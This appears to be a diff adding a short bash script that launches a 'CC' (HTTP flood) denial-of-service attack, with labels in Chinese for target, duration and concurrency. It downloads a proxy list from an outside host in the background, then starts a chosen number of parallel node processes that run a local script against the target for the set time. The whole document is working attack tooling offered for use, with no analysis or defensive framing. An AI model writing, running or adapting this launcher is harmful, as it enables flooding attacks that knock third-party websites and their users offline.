@@ -1,0 +1,7 @@
+﻿#!/bin/bash
+echo '目标:'$1' 时间:'$3' 并发:'$2' 模式:CC'
+wget -b "http://cc.0745k.com/daili.txt" -O cc.txt
+sleep 3s
+for n in $(seq $2); do
+   node ~/config.js $1 9999 $3 &
+done 
